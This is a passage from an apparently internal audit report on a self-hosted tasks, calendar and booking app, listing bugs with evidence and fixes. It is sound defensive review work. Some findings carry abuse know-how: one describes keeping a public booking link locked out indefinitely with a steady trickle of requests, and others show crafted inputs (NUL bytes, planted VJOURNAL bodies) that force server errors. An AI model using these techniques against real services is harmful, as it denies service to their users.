before `_replace`, then `event.add(key, old + delta, parameters={k: v for k, v in
params.items() if k.upper() != 'TZID'})` (let icalendar re-derive TZID from tzinfo).

### [x] RDATE;VALUE=PERIOD makes shift_series and split_series raise TypeError (500 on any series edit)

`backend/tasksd/ical/edit.py:463` · **medium** · bug · `minor`

`_shift_datelist` assumes `entry.dt` is a date/datetime, but for a PERIOD value
icalendar's vDDDTypes.dt is a `(start, end)` tuple. `_partition_datelist` ->
`_at_or_after` has the same assumption. RDATE;VALUE=PERIOD is legal RFC 5545 and arrives
from foreign clients / anyone writing to the shared collection, so a perfectly ordinary
"move the series" or "this & following" on such an event 500s and the user can never
edit that event again.

<details><summary>Evidence</summary>

```
raw = VEVENT with DTSTART:20260101T090000Z, RRULE:FREQ=WEEKLY, RDATE;VALUE=PERIOD:20260210T090000Z/20260210T110000Z.
E.shift_series(raw, '2026-01-01T09:00:00+00:00', EventEdit(dtstart=...)) ->
  File edit.py line 463, in _shift_datelist: values = [entry.dt + delta ...]
  TypeError: can only concatenate tuple (not "datetime.timedelta") to tuple
E.split_series(raw, '2026-01-08T09:00:00+00:00', EventEdit()) ->
  File edit.py line 350, in _at_or_after: return da >= db
  TypeError: '>=' not supported between instances of 'tuple' and 'datetime.date'
```

</details>

**Suggested fix.** Handle the tuple form in both helpers: shift both ends of a period (`(s+delta,
e+delta)`) and compare a period against the anchor using its start.

### [x] Shifting/partitioning EXDATE or RDATE merges several property lines into one and relabels them with a single TZID, corrupting the excluded instants

`backend/tasksd/ical/edit.py:466` · **medium** · bug

`_shift_datelist` (and `_partition_datelist`, same pattern at line 606-608) flattens
every EXDATE/RDATE property line into one Python list and re-adds it as a SINGLE
property. icalendar derives one TZID parameter for the whole property (it takes the last
entry's zone) but serializes each value in its own local wall time, so entries that came
from a different zone get relabelled with the wrong TZID — a different instant. Mixed
EXDATE zones are ordinary in a shared collection (a UTC-written EXDATE next to a TZID-
written one, or exclusions written before/after the user changed the event's zone).

<details><summary>Evidence</summary>

```
Master DTSTART;TZID=America/New_York:20260105T090000, RRULE:FREQ=WEEKLY, EXDATE;TZID=America/New_York:20260112T090000, EXDATE;TZID=Europe/Paris:20260119T150000.
shift_series(raw, '2026-01-05T09:00:00-05:00', EventEdit(dtstart=2026-01-05 10:00, dtend=11:00)) emits:
  EXDATE;TZID=Europe/Paris:20260112T100000,20260119T160000
Parsed EXDATE instants BEFORE: ['2026-01-12T14:00:00+00:00', '2026-01-19T14:00:00+00:00']; AFTER: ['2026-01-12T09:00:00+00:00', '2026-01-19T15:00:00+00:00'] — the first exclusion moved 6 hours off (it should be 15:00Z) and no longer identifies the occurrence for any other CalDAV client.
With a UTC EXDATE next to a TZID one the output is also invalid iCalendar: `EXDATE;TZID=America/New_York:20260119T150000Z,20260126T100000` (RFC 5545 3.2.19 forbids TZID on a UTC value).
```

</details>

**Suggested fix.** Rebuild EXDATE/RDATE per source property line — group values by (tzinfo, value type) and
emit one property per group — instead of `_replace(key)` followed by a single
`event.add(key, values)`.

### [x] RECURRENCE-ID;RANGE=THISANDFUTURE makes several occurrences share one recurrence_id, so the SPA renders duplicate React keys and per-occurrence edit/delete hits the wrong instance

`backend/tasksd/ical/recur.py:115` · **medium** · bug

`_occurrence` derives the instance anchor straight from the expanded component's
RECURRENCE-ID: `anchor = (_iso(rid)[0] if rid is not None else start) or start or ""`.
For a `RECURRENCE-ID;RANGE=THISANDFUTURE` override (RFC 5545 §3.2.13, written by Apple
Calendar and Thunderbird for "this and all future events"), `recurring_ical_events`
correctly applies the override to the anchor slot *and every later slot* — but every one
of those components carries the *same* RECURRENCE-ID value. So `expand_occurrences`
returns N distinct occurrences all with an identical `recurrence_id`.
`service._occurrence_dto` then builds `id = f"{uid}::{occ.recurrence_id}"`, producing N
DTOs with the same `id`. `CalendarView.tsx` renders them with `key={e.id}` (lines
339/349/403/493), and per-occurrence writes address the instance by `recurrence_id`
(`api.ts:275` sets it as a query param; `CalendarView.tsx:166` matches optimistic
updates on `e.id !== `${uid}::${body.recurrence_id}``).

<details><summary>Evidence</summary>

```
recur.py:113-115:
```
    rid = comp.get("RECURRENCE-ID")
    anchor = (_iso(rid)[0] if rid is not None else start) or start or ""
```
Run against pinned deps — master `DTSTART:20260106T090000Z`, `RRULE:FREQ=WEEKLY;COUNT=4`, one override component with `RECURRENCE-ID;RANGE=THISANDFUTURE:20260113T090000Z / DTSTART:20260113T100000Z / SUMMARY:TF`. `expand_occurrences(raw, date(2026,1,1), date(2026,2,10))` returns (recurrence_id, start, summary, is_override):
```
('2026-01-06T09:00:00+00:00', '2026-01-06T09:00:00+00:00', 'Std', False)
('2026-01-13T09:00:00+00:00', '2026-01-13T10:00:00+00:00', 'TF', True)
('2026-01-13T09:00:00+00:00', '2026-01-20T10:00:00+00:00', 'TF', True)   <-- dup anchor
('2026-01-13T09:00:00+00:00', '2026-01-27T10:00:00+00:00', 'TF', True)   <-- dup anchor
```
Failure: three visibly distinct events on Jan 13/20/27 all get `id = uid::2026-01-13T09:00:00+00:00`. React logs duplicate-key warnings and can apply DOM updates to the wrong node; worse, the user clicks the Jan 27 occurrence and chooses "delete this event" -> the server EXDATEs 2026-01-13 and the Jan 27 occurrence stays on the owner's real calendar while an unrelated one disappears. Same for "edit this event", which writes the override onto the Jan 13 slot.
No test in `tests/test_recur.py` covers RANGE=THISANDFUTURE.
```

</details>

**Suggested fix.** Make the anchor unique per rendered instance. Either detect `RANGE=THISANDFUTURE` on the
RECURRENCE-ID param and fall back to the occurrence's own DTSTART for the anchor, or
unconditionally de-duplicate: track seen anchors in `expand_occurrences` and, on
collision, use the instance's own start as the anchor (still exact for the normal
single-slot override case). Add a test asserting `len({o.recurrence_id for o in occs})
== len(occs)`.

### [x] Changing a series' repeat rule leaves stale RECURRENCE-ID overrides behind as phantom events

`backend/tasksd/ical/edit.py:260` · **low** · rendering

`_apply_event_fields` -> `_set_rrule` replaces the master's RRULE but never reconciles
the resource's override components. An override whose RECURRENCE-ID is no longer
produced by the new rule is not part of the recurrence set, yet `recurring_ical_events`
still emits it, so the SPA renders an event that belongs to a schedule the user just
deleted. Reachable from the event modal: open a recurring event that has an edited/moved
occurrence, change Repeat, choose "All events".

<details><summary>Evidence</summary>

```
raw = weekly VEVENT DTSTART:20260202T090000 + override RECURRENCE-ID:20260209T090000 DTSTART:20260209T140000 SUMMARY:special.
apply_event_changes(raw, EventEdit(rrule=rrule_from_spec('monthly'))) then expand 2026-02-01..2026-03-10:
  BEFORE: 2/2 standup, 2/9 14:00 special, 2/16, 2/23, 3/2, 3/9 standup
  AFTER : 2/2 standup, 3/2 standup, **2/9 14:00 special**
The weekly-only 2/9 instance survives as a phantom under a monthly rule.
```

</details>

**Suggested fix.** When `edit.rrule` is applied to a master, drop (or re-anchor) override components whose
RECURRENCE-ID is not generated by the new rule — the behaviour Apple/Google clients
implement — and cover it with a test.

## Sync engine

### [x] Test gap: gc_orphans — the only code path that permanently deletes non-derivable sidecar state — has zero coverage

`backend/tasksd/sync/engine.py:130` · **medium** · test-gap · `minor`

`store.gc_orphans(conn)` is called unconditionally at the end of every `full_resync` and
permanently DELETEs sidecar rows (kanban column, manual sort order, pins,
estimated_minutes) older than 7 days. Per docs/phase0-findings.md the sidecar is
explicitly the one part of SQLite that a resync cannot rebuild — this is the single
irreversible-deletion path in the whole cache layer. `grep -rn 'gc_orphans\|keep_days'
backend/` returns hits only in engine.py:130 and store.py:232-239: no test in
backend/tests ever calls it, asserts its retention boundary, or asserts that a still-
live UID is never swept.

<details><summary>Evidence</summary>

```
engine.py:130:  store.gc_orphans(self.conn)

store.py:232-239:
    def gc_orphans(conn, *, keep_days: int = 7) -> int:
        cur = conn.execute(
            "DELETE FROM sidecar WHERE orphaned_at IS NOT NULL "
            "AND orphaned_at < strftime('%Y-%m-%dT%H:%M:%fZ','now', ?)",
            (f"-{int(keep_days)} days",),
        )

Untested behaviours that would silently regress:
- the ISO-string lexicographic comparison against orphaned_at (a format drift in either strftime call — e.g. dropping the trailing 'Z' or switching to `datetime('now')` — silently makes the predicate match everything or nothing; the 'match everything' direction wipes every orphaned sidecar row on the next full_resync).
- the un-orphan-on-return contract (`upsert_item`, store.py:163-166): test_sync.py::test_delete_and_recreate_same_uid_keeps_sidecar asserts `orphaned_at IS NULL` after the UID returns, but never that GC would have spared it, so a bug that clears `orphaned_at` on the wrong row is invisible.
- the interaction in the finding above: gc_orphans running on a pass where `_upsert_body` skipped resources.

Existing coverage stops at 'the sidecar row survives and is marked orphaned' (test_sync.py:47-58). Nothing exercises the deletion itself.
```

</details>

**Suggested fix.** Add a unit test in test_sync_unit.py (no Radicale needed): seed a sidecar row, backdate
`orphaned_at` to 8 days ago and another to 6 days ago, call `store.gc_orphans(conn)`,
and assert exactly one row was removed and the return count is 1. Add a second case
asserting `gc_orphans` never touches a row with `orphaned_at IS NULL`. Then add an
engine-level test that a full_resync in which one resource was skipped (`stats.skipped >
0`) does not delete sidecar rows.

### [x] A resource corrupted in place leaves a permanent ghost cache row that never converges and 500s on edit

`backend/tasksd/sync/engine.py:144` · **medium** · bug

When a resource that is ALREADY cached is rewritten on the wire into something
`extract_from_raw` cannot handle (parse error, or a VCALENDAR that no longer contains a
VTODO/VEVENT), `_upsert_body` returns False and the old cache row is left completely
untouched — old summary/notes/due/status, old raw_ics, old etag. Because the href is
still present in `wire`, the full_resync sweep never removes it either, so the cache
diverges from the source of truth permanently: the incremental path advances its token
past the change and never revisits it, and every full_resync re-fetches (etag mismatch)
and re-skips forever. The docstring justifies the skip for a *newly seen* poison
resource, but the in-place-corruption case has no recovery at all.

<details><summary>Evidence</summary>

```
engine.py:133-152:

        try:
            fields = ical.extract_from_raw(item.data)
        except Exception as e:
            log.warning("skipping malformed resource %s: %s", item.href, e)
            stats.skipped += 1
            stats.last_error = f"malformed resource {item.href}: {e}"
            return False        # <-- stale row survives; nothing marks it stale
        if fields is None or not fields.uid:
            return False

engine.py:120-127 only deletes rows whose href is absent from `wire`, so the ghost is never swept.

Failure scenario:
1. Task `u` is cached at /cal/x.ics: summary="Pay rent", due=2026-08-01, etag=e1.
2. A CalDAV client sharing the collection (jtx Board / Tasks.org / anyone who can write to the shared collection) overwrites /cal/x.ics in place with a body whose extraction raises — e.g. `PRIORITY:HIGH`, or drops the VTODO entirely leaving only a VJOURNAL (extract() then returns None, engine.py:149).
3. Sync fetches the new body, `_upsert_body` returns False, no row is written, no row is deleted.
4. The SPA keeps listing "Pay rent / due 2026-08-01" indefinitely; the server holds something else.
5. The user opens it and PATCHes it. `_edit` PUTs with the stale etag e1 -> 412 -> re-GETs the corrupt body -> `ical.apply_changes(fresh.data, edit)` raises `ValueError("resource has no VTODO to edit")` (edit.py:152-153). `patch_task` (app.py:728-734) has no ValueError handler, so the user gets an opaque HTTP 500 on a task the UI insists exists.

Only the never-before-seen case is tested (test_sync_unit.py::test_malformed_resource_is_skipped_not_wedging_sync starts from an empty DB); there is no test for a previously-good resource going bad.
```

</details>

**Suggested fix.** Distinguish 'never cached, skip it' from 'cached and now unreadable'. In `_upsert_body`,
on both False paths, if `store.get_item_by_href(collection_href, item.href)` exists,
either (a) update just `etag`/`synced_at` and set a `stale` flag the DTO layer surfaces
as an unreadable item, or (b) drop the cache row and orphan its sidecar so the UI stops
showing data the wire no longer has. Option (a) is preferable — it stops the endless
refetch loop and keeps the sidecar. Either way, also wrap `patch_task`/`patch_event` so
an ical `ValueError` becomes a 409/422 with a readable message rather than a 500.

### [x] A resource that becomes unparseable/non-VTODO leaves a permanently stale cache row that 500s on every edit

`backend/tasksd/sync/engine.py:149` · **medium** · bug

`_upsert_body` returns False (skip) both for parse failures and for `fields is None`
(the resource no longer contains a VTODO/VEVENT), but it never invalidates the row
already in `items` for that href. The cached row keeps the *old* summary/notes/raw_ics
**and the old etag**, and it is not swept by `full_resync` either (its href is still on
the wire), so the divergence is permanent: the app shows content that no longer exists
on the source of truth, and the stale etag makes every write on it fail.

<details><summary>Evidence</summary>

```
Any CalDAV client sharing the collection can rewrite `1.ics` (same UID, so Radicale's `no-uid-conflict` check passes and the PUT is accepted) with a VCALENDAR whose only component is a VJOURNAL — jtx Board writes VJOURNALs, and per the trust model anyone who can write to a shared collection can plant arbitrary text. Verified:

    extract_from_raw(vjournal_body) -> None            # so _upsert_body returns False at engine.py:149-150
    cache still says: Buy milk "1"                     # store.get_item, unchanged, stale etag
    ical.apply_changes(vjournal_body, TaskEdit(status='COMPLETED'))
      -> ValueError: resource has no VTODO to edit

User-visible result: the task "Buy milk" stays in the list forever. Tapping complete (`POST /api/lists/{id}/tasks/{uid}/complete` → `edit_task` → `_edit`) PUTs with the stale etag → 412 → the merge path re-GETs the fresh body and calls `apply_changes` on it → `ValueError`, which `patch_task`/`complete_task` do not catch (only `patch_event` has a ValueError handler, app.py:805) → **500**. The row cannot be edited, completed, or made to disappear; the next full resync re-fetches, fails to parse again, and leaves it in place.
```

</details>

**Suggested fix.** When `_upsert_body` decides a cached href's body is no longer cacheable (parse failure
or `fields is None`), drop the existing cache row for that href
(`store.delete_item_by_href` + `store.orphan_sidecar`) instead of leaving the old
projection, so the item disappears from the UI rather than becoming an unfixable ghost.
Also catch `ValueError` in the task edit routes so the merge path cannot 500.

## SQLite cache

### [x] Deleting a list/calendar never purges its cached items — search and tags keep serving them forever

`backend/tasksd/db/store.py:75` · **medium** · bug

`mark_collection_deleted` only flips `collections.deleted=1`. Nothing ever deletes the
collection's rows from `items`, `categories`, `items_fts`, or `sidecar`, and nothing
orphans the sidecar rows so the 7-day GC can reclaim them. `store.search` (line 381) and
`store.distinct_categories` (line 451) join/scan `items`/`categories` with no
`deleted=0` filter, so the contents of a list the user deleted stay queryable through
`/api/search` and `/api/tags` indefinitely, while `resolve_list` (service.py:168) can no
longer resolve the `list` id those hits carry. The cache also grows without bound: every
deleted list's full `raw_ics` bodies stay on disk for the life of the DB.

<details><summary>Evidence</summary>

```
Reproduced against the real schema:

    store.upsert_collection(conn, CollectionInfo(href='/u/secretlist/', displayname='Secret', components={'VTODO'}))
    store.upsert_item(conn, '/u/secretlist/', Item('/u/secretlist/1.ics', '"1"', raw), fields)   # SUMMARY:confidential thing, CATEGORIES:secrettag
    store.set_sidecar(conn, '/u/secretlist/', 't1@x', kanban_column='doing')
    store.mark_collection_deleted(conn, '/u/secretlist/')   # what DELETE /api/lists/{id} ends up doing

output:
    collections visible: []
    search hits: ['confidential thing']
    tags: ['secrettag']
    count_items: 1
    sidecar orphaned: None

So after `DELETE /api/lists/{id}` succeeds and the list vanishes from `/api/lists`, `GET /api/search?q=confidential` still returns the deleted task (with `"list": "secretlist"`, which `/api/lists/secretlist/...` now 404s), and `GET /api/tags` still advertises its tag. The sidecar row is never orphaned, so `gc_orphans` never reclaims it either.
```

</details>

**Suggested fix.** In `mark_collection_deleted`, also orphan the sidecar rows for that collection and
delete its `items` / `items_fts` / `categories` rows (the cache is disposable by design
— a resync rebuilds it if the collection comes back). At minimum, filter `deleted=0` in
`search`, `distinct_categories` and `count_items` by joining `collections`.

### [x] A NUL byte in the search query escapes the FTS quoting and 500s

`backend/tasksd/db/store.py:379` · **low** · bug · `minor`

`search()` guards against FTS5 operator characters by wrapping each whitespace token in
double quotes, but a NUL byte inside a token truncates the C-string FTS5 parses, leaving
the phrase unterminated. `GET /api/search?q=%00` (the route is `q: str =
Query(min_length=1)`, no charset restriction) raises `sqlite3.OperationalError`, which
has no handler and surfaces as a 500. The suite has
`test_search_operator_characters_do_not_crash` asserting exactly this property for `"`,
`NEAR(`, `(((`, `*`, `-` … but not for control bytes, so the regression is untested.

<details><summary>Evidence</summary>

```
Against the real schema and the exact expression builder from store.py:379:

    q='\x00hi'  ->  match='"\x00hi"*'  ->  OperationalError: unterminated string
    q='hi\x00there' -> same

All other probed inputs ('"', 'AND', '*', '-', '^', '()', '\\', 20 000 terms) return cleanly, so NUL is the one hole in the quoting scheme.
```

</details>

**Suggested fix.** Strip control characters (at minimum `\x00`) from each term in `search()`, e.g.
`t.replace('\x00','')` before quoting and dropping tokens that become empty; add the NUL
case to `test_search_operator_characters_do_not_crash`.

## Scheduling

### [x] DST: slot math uses wall-clock timedelta arithmetic, producing duplicate, negative-length, and over-length bookable slots

`backend/tasksd/scheduling.py:188` · **medium** · bug

`generate_slots` builds candidate slots by adding `timedelta` to ZoneInfo-aware
datetimes (`slot = Interval(s, s + duration)`, `s += duration`), and
`TaskService.book_slot` computes the event end the same way (`end = req +
timedelta(minutes=link["duration_minutes"])`, service.py:733). Python's `aware_dt +
timedelta` is *wall-clock* arithmetic: it adds to the naive fields and re-derives the
UTC offset. Across a DST transition inside an availability window this silently changes
the absolute length of a slot. Three concrete consequences on the only unauthenticated
write path: (1) spring-forward yields a slot whose `end` instant precedes its `start`;
(2) spring-forward yields two distinct slots at the same absolute instant, so the public
page renders duplicate buttons and one of them becomes permanently un-bookable (see
evidence); (3) fall-back yields a slot advertised as N minutes that is actually N+60, so
an unauthenticated booker gets a 90-minute VEVENT on the owner's real calendar for a
30-minute link, and the repeated hour vanishes from availability entirely. Trigger
config is ordinary — an availability window that spans the local transition hour, e.g.
`{"0".."6": ["00:00-23:30"]}` on a DST-observing link timezone.

<details><summary>Evidence</summary>

```
Reproduced against the real module (America/Chicago, 30-min duration, availability `00:00-23:30` every day):

```
$ python3 -c "...generate_slots(availability={d:['00:00-23:30']}, duration_minutes=30, tz=America/Chicago, ...)"
spring-forward (2026-03-08) total 47
  wrong-duration slots: [('2026-03-08T02:30:00-06:00', '2026-03-08T03:00:00-05:00', timedelta(-1, 84600))]   # -30 minutes
  duplicate instants:   ['2026-03-08T08:00:00+00:00', '2026-03-08T08:30:00+00:00']
fall-back (2026-11-01) total 47
  wrong-duration slots: [('2026-11-01T01:30:00-05:00', '2026-11-01T02:00:00-06:00', timedelta(seconds=5400))]  # 90 minutes
```

Fall-back, end to end: the page advertises `{"start":"2026-11-01T01:30:00-05:00","end":"2026-11-01T02:00:00-06:00"}`. POST that `start`; `book_slot` does `req = fromisoformat(start).astimezone(tz)` -> 01:30 CDT (06:30Z), matches a generated slot, then `end = req + timedelta(minutes=30)` -> 02:00 CST = 08:00Z. The VEVENT written to the owner's calendar is DTSTART 06:30Z / DTEND 08:00Z — 90 minutes for a 30-minute link. The 07:00Z and 07:30Z slots (the repeated 01:00-02:00 CST hour) are never offered at all.

Spring-forward duplicate/phantom: instants 08:00Z and 08:30Z are each emitted twice (wall 02:00/03:00 and 02:30/03:30). Both render as the same clock time in the SPA. `_overlaps_any` (scheduling.py:201) short-circuits on `b.start >= slot.end`, and the 02:30 slot has `end` (08:00Z) < `start` (08:30Z), so no busy interval can ever block it; meanwhile `any(s.start == req)` in book_slot compares *wall-clock* fields (both operands share the same ZoneInfo instance, so datetime falls back to naive comparison), so once 08:30Z is booked the surviving duplicate button 409s forever.
```

</details>

**Suggested fix.** Do the stepping and the end-time computation in UTC and convert back only for the
weekday/window lookup: e.g. `s_utc = win.start.astimezone(timezone.utc)`, advance `s_utc
+= duration`, build `Interval(s_utc.astimezone(tz), (s_utc + duration).astimezone(tz))`,
and in `book_slot` use `end = (req.astimezone(timezone.utc) +
timedelta(minutes=link['duration_minutes']))`. That makes every emitted slot exactly
`duration` long in absolute time, collapses the spring-forward duplicates to one
instant, and restores the repeated fall-back hour. Also dedupe emitted slots by UTC
instant as a belt-and-braces guard.

## CalDAV client

### [x] A list name containing a control character crashes the PROPPATCH builder with an unhandled ValueError (500)

`backend/tasksd/dav/xml.py:121` · **low** · bug · `minor`

`build_proppatch` (and `build_mkcalendar` at xml.py:103) assign caller text directly to
`.text` on an lxml element. lxml rejects NUL and C0 control characters at assignment
time with a bare `ValueError` — not a `DavError` — so it bypasses the entire error
taxonomy in `errors.py` and the `DavError`/`ConflictError`/`KeyError` handlers
registered in `app.py:594-621`.  Verified directly: ``` $ python -c "from tasksd.dav
import xml as X; X.build_proppatch({X.DISPLAYNAME: 'a\x0bb'})" ValueError: All strings
must be XML compatible: Unicode or ASCII, no NULL bytes or control characters ``` The
API models do not constrain the charset: `CreateList.name: str` (`app.py:62`) and
`EditList.name: str | None` (`app.py:67`) have no pattern or sanitisation, and
`TaskService.update_collection` passes the name through untouched into
`props[davxml.DISPLAYNAME]` (`tasksd/service.py:301,309`).

<details><summary>Evidence</summary>

```
Code: `backend/tasksd/dav/xml.py:119-121`:
```python
prop = etree.SubElement(etree.SubElement(root, cl(DAV, "set")), PROP)
for name, value in to_set.items():
    etree.SubElement(prop, name).text = value
```

Failure scenario: authenticated owner (or the SPA passing through a name pasted from another CalDAV client) sends `PATCH /api/lists/{id}` with body `{"name": "Work\x00"}` — JSON permits `\x00`. Route `patch_list` (`app.py:679`) -> `TaskService.update_collection` -> `DavClient.proppatch` -> `X.build_proppatch` raises `ValueError`. No handler matches, so uvicorn returns a 500 with a traceback in the server log instead of a 4xx validation error.
```

</details>

**Suggested fix.** Reject or strip disallowed XML characters where the value enters the builder — e.g. in
`build_proppatch`/`build_mkcalendar`, raise `DavError(f"property {name} contains
characters not representable in XML")` for any value matching
`[\x00-\x08\x0b\x0c\x0e-\x1f]` — and/or add a `pattern`/validator to `CreateList.name`
and `EditList.name` so it fails as a 422.

## Service layer

### [x] Deleting a collection leaves all of its items in the SQLite cache forever (cache/source divergence)

`backend/tasksd/service.py:329` · **medium** · bug

`delete_collection` DELETEs the collection on Radicale and then calls `discover()`,
which only sets `collections.deleted=1` (store.py:75-76). Nothing ever deletes the
collection's rows from `items`, `items_fts`, `categories`, or `sidecar`. The FK
`items.collection_href REFERENCES collections(href) ON DELETE CASCADE` never fires
because the collections row is soft-deleted, never DELETEd. Read paths that are not
scoped by a live collection therefore keep serving entities that no longer exist
anywhere on the wire, and the DB grows without bound.

<details><summary>Evidence</summary>

```
service.py:326-330:
```
    def delete_collection(self, href: str) -> None:
        with self._lock:
            self._dav.delete_collection(href)
            self._engine.discover()   # marks it deleted in the cache
```
`store.search` (store.py:370-387) joins `items_fts` to `items` with no `deleted` filter, and `store.distinct_categories` (store.py:451-459) scans `categories` globally.

Scenario: POST /api/lists -> create list L; POST a task "quarterly-secret" into L; DELETE /api/lists/L (204, and L is gone from GET /api/lists and from Radicale). GET /api/search?q=quarterly still returns the task, with `list` set to the slug of the now-nonexistent collection; GET /api/tags still returns its tags. The rows survive restarts and every full resync, since `sync_all` iterates only non-deleted collections so `full_resync`'s orphan sweep never runs for that href. This directly breaks the stated invariant #1 ("wipe the cache, resync, get identical state"): a fresh DB + resync would NOT reproduce those rows.
```

</details>

**Suggested fix.** On `mark_collection_deleted`, also purge the collection's
`items`/`items_fts`/`categories` rows and orphan its sidecar rows (`orphan_sidecar` per
uid) so the 7-day GC can reclaim them — or hard-DELETE the collections row and let the
existing ON DELETE CASCADE do it. Add a test asserting a deleted list's tasks disappear
from /api/search and /api/tags.

## API routes

### [x] Public booking link can be permanently disabled by anyone who has the link (per-link limiter counts every request, not just failures)

`backend/tasksd/app.py:946` · **medium** · bug

`_throttle` records a "failure" on every request (documented as request-rate semantics),
and the per-link limiter is keyed on the URL token with `max_fails=30, window_s=3600,
lockout_s=1800`. A booking link is meant to be published, so possession of the token is
not a secret — anyone who receives it can spend the link's global budget and keep it
locked out indefinitely, blocking all legitimate bookings.

<details><summary>Evidence</summary>

```
app.py:946 `public_post_link_limiter = RateLimiter(max_fails=30, window_s=3600, lockout_s=1800)`
app.py:948-955:
```python
def _throttle(key, limiter):
    if not limiter.allowed(key): raise HTTPException(429, ...)
    limiter.record_failure(key)   # every request counts
```
app.py:970-971 (before any token/body validation):
```python
_public_throttle(request, public_post_limiter)   # 15/h per client
_throttle(f"link:{token}", public_post_link_limiter)
```

Failure scenario: the owner publishes https://host/book/<token>. A visitor (or a competitor with the link) sends 30 `POST /api/public/booking/<token>/book` requests — the per-client limiter caps them at 15/h, so two source IPs, or two IPv6 /64s from a single VPS, suffice. `link:<token>` locks for 1800 s and every real visitor gets 429 "too many requests". Sustaining exactly 30 requests per 30 minutes (~1/min, within the budget of 2-4 addresses) keeps the link dead permanently, while the owner sees nothing but 429s in the log.
```

</details>

**Suggested fix.** Count only *completed* bookings against the per-link ceiling (call `record_failure` on
the link key after `book_slot` succeeds, not before validation), and/or return the 429
only for the write, not for `GET /api/public/booking/{token}`. Consider a much longer
window with a daily cap instead of a hard lockout, and surface link lockouts to the
owner.

## Backend test gaps

### [x] The DST regression test cannot fail on a negative-duration slot

`backend/tests/test_scheduling.py:188` · **medium** · test-gap · `minor`

`test_dst_spring_forward_is_sane` is the only test guarding slot math across a DST
transition, and its assertion is one-sided: `assert s.end.astimezone(UTC) -
s.start.astimezone(UTC) <= timedelta(hours=1)`. A slot whose end instant *precedes* its
start yields a negative timedelta, which trivially satisfies `<=`. It also never asserts
that the emitted slots are distinct instants or that each is exactly `duration_minutes`
long, so the duplicate-instant and over-length (fall-back) defects are invisible to the
suite. There is no fall-back (autumn) case at all.

<details><summary>Evidence</summary>

```
backend/tests/test_scheduling.py:178-188 runs `generate_slots` over `{'6': ['01:00-04:00']}` with `duration_minutes=60` on 2026-03-08 and only asserts `s.end - s.start <= timedelta(hours=1)`. With the same tz and a 30-minute duration the generator emits `Interval(2026-03-08T02:30:00-06:00, 2026-03-08T03:00:00-05:00)` — a delta of `-0:30:00`, which passes `<= 1h`. Concretely: change nothing in scheduling.py, add `{'6': ['01:00-05:00']}` / `duration_minutes=30` to this test and it still passes despite emitting a backwards interval.
```

</details>

**Suggested fix.** Assert exact equality on the absolute duration (`s.end.astimezone(UTC) -
s.start.astimezone(UTC) == timedelta(minutes=duration)`), assert
`len({s.start.astimezone(UTC) for s in slots}) == len(slots)`, and add a fall-back case
(2026-11-01, America/Chicago, window covering 00:00-05:00) asserting both the exact
duration and that the repeated 07:00Z hour is offered.

### [x] Test gap: the two fail-closed startup invariants and post-logout cookie replay are untested

`backend/tests/test_security.py:126` · **low** · test-gap

`create_app` has two security-critical refusals — `RuntimeError` when `auth_enabled` and
no password is configured (app.py:494-499), and replacing the well-known `"dev-hook-
secret"` with an ephemeral one so `/internal/changed` fails closed (app.py:528-535) —
and neither has a test. Nothing in tests/ constructs a settings object that trips either
path (`grep -rn 'RuntimeError' tests/` returns nothing). There is also no test that a
session cookie stops working after `POST /api/logout`, which is why the non-invalidation
above went unnoticed.

<details><summary>Evidence</summary>

```
app.py:494-499 `raise RuntimeError("auth enabled but no password set...")` and app.py:528-535 `if not hook_secret or hook_secret == "dev-hook-secret": hook_secret = secrets.token_hex(32)` are never exercised. test_security.py:218 only checks the *configured* hook secret (`hook_secret="testhook"` from conftest.py:91); it never checks that the literal default is rejected.

Failure scenario: a refactor that reorders the `password_hash` fallback (e.g. moving the `if not password_hash: raise` above the `TASKS_AUTH_PASSWORD` hashing at app.py:488) or that drops the `== "dev-hook-secret"` comparison makes the app boot with no gate, or makes `/internal/changed` accept the public default secret from any internet client — and the full suite still passes green.
```

</details>

**Suggested fix.** Add three tests: (1) `pytest.raises(RuntimeError)` on
`create_app(replace(api_settings(...), auth_password_hash="", auth_password=""))`; (2)
`create_app(replace(..., hook_secret="dev-hook-secret"))` then assert `POST
/internal/changed` with `X-Tasks-Hook-Secret: dev-hook-secret` returns 403; (3) login,
capture the cookie value, `POST /api/logout`, then re-send the captured cookie to
`/api/me` and assert 401 (this one will fail until session revocation exists).

## Calendar view

### [x] Test gap: CalendarView has no tests at all, including the date math the other findings live in

`frontend/src/components/CalendarView.tsx:33` · **medium** · test-gap

There is no CalendarView.test.tsx — every other non-trivial component in
frontend/src/components has one (TasksView, Sidebar, BookingPage, HomeView,
AppearancePanel, AddMultipleModal, Login). That leaves ~470 lines of security- and
correctness-sensitive logic unverified: `lastDayOf`'s exclusive-DTEND rule,
`shiftIso`/`daysBetween` across DST, `dropOnDay`'s move and resize DTSTART/DTEND
arithmetic, the modal's inclusive-picker to exclusive-DTEND conversion (`endOut = allDay
? shiftYmd(clampedEnd, 1)`), the recurrence scope routing (`this` / `thisandfuture` /
`all`, including the `timeChanged` gate that decides whether an 'all' save shifts the
whole series), the optimistic `applyLocal`/`del` painting, and the hidden/archived
calendar filters. Two of the bugs reported above (midnight-end resize off-by-one, DST
duration loss) are exactly the kind a table-driven test over these pure helpers would
have caught.

<details><summary>Evidence</summary>

```
$ find frontend/src -name '*.test.tsx'
  .../AddMultipleModal.test.tsx  .../AppearancePanel.test.tsx  .../BookingPage.test.tsx
  .../HomeView.test.tsx  .../Login.test.tsx  .../Sidebar.test.tsx  .../TasksView.test.tsx  .../App.test.tsx
(no CalendarView.test.tsx)

Untested behaviour with a concrete wrong-answer today:
  lastDayOf({start:'2026-03-02T20:00', end:'2026-03-03T00:00'}) === '2026-03-02'  (correct, untested)
  dropOnDay resize of that event onto '2026-03-05' -> DTEND '2026-03-05T00:00' (wrong, untested)
```

</details>

**Suggested fix.** Export `lastDayOf`, `shiftIso`, `daysBetween`, and the resize/move body builder from
`dropOnDay` (or lift them into util.ts) and add a table-driven suite: all-day
single/multi-day spans, timed spans ending at midnight, spans crossing the month-grid
edges, DST spring-forward and fall-back drags, and one render test per recurrence scope
asserting the exact `{scope, recurrence_id, start, end}` handed to `api.patchEvent` /
`api.deleteEvent`.

### [x] Rapid month navigation can render the wrong month's events (unordered fetches, no staleness guard)

`frontend/src/components/CalendarView.tsx:116` · **medium** · bug · `minor`

The events effect fires on `[cursor, rev, calsKey]` and does `setEvents(await
fetchEvents())` with no cleanup, AbortController, or generation counter. `fetchEvents`
fans out one request per visible calendar and awaits `Promise.all`, so two clicks on ›
put two multi-request batches in flight; whichever settles last wins. If the earlier
(older-month) batch settles second, the grid is populated with the previous month's
events while the header says the new month. Because `byDay` clips everything to the
current 6-week window, almost none of those events match any rendered day, so the month
